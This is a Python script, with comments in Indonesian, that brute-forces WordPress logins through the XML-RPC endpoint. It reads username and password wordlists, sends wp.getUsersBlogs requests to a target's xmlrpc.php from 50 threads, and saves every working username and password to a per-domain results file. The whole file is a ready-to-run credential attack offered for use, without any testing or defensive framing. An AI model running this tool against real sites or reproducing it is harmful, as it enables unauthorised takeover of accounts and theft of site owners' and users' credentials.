import requests
import os
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse
from assets.colors import *

def check_https(target):
    """Cek apakah target bisa diakses via HTTPS. Kalau gagal, fallback ke HTTP."""
    try:
        response = requests.get(target, timeout=5) 
        if response.status_code == 200:
            return target 
    except requests.exceptions.RequestException:
        print(f"[{red}!{white}] {cyan}{target}{white} tidak support HTTPS, fallback ke HTTP")
    
    return target.replace("https://", "http://", 1)


def save_result(domain, username, password):
    folder = "results"
    if not os.path.exists(folder):
        os.makedirs(folder)  

    parsed_url = urlparse(domain) 
    clean_domain = parsed_url.netloc  

    filename = f"{folder}/xmlrpc_https_{clean_domain}.txt"

    try:
        with open(filename, "a") as save:
            save.write(f"[{green}SUCCESS{white}] {username} : {password}\n")
        print(f"[{green}+{white}] Saved: {username} = {password} -> {filename}")
    except Exception as e:
        print(f"[{red}ERROR{white}] Gagal menyimpan hasil: {e}")



def brute_force(target, usernames, passwords, threads=50):
    target = check_https(target)
    xmlrpc_url = f"{target}/xmlrpc.php"

    with open(usernames, "r") as user_file, open(passwords, "r") as pass_file:
        username_list = [line.strip() for line in user_file]
        password_list = [line.strip() for line in pass_file]

    def attempt_login(username, password):
        payload = f"""
        <?xml version="1.0"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{username}</value></param>
                <param><value>{password}</value></param>
            </params>
        </methodCall>
        """

        headers = {"Content-Type": "text/xml"}
        try:
            response = requests.post(xmlrpc_url, data=payload, headers=headers, timeout=10)

            if "isAdmin" in response.text or "blogid" in response.text:
                print(f"[{green}SUCCESS{white}] {username}:{password}")
                save_result(target, username, password)
            else:
                print(f"[{red}FAILED{white}] {username}:{password}")
        except requests.exceptions.RequestException as e:
            print(f"[{red}ERROR{white}] Request failed: {e}")

    with ThreadPoolExecutor(max_workers=threads) as executor:
        for user in username_list:
            for pwd in password_list:
                executor.submit(attempt_login, user, pwd)

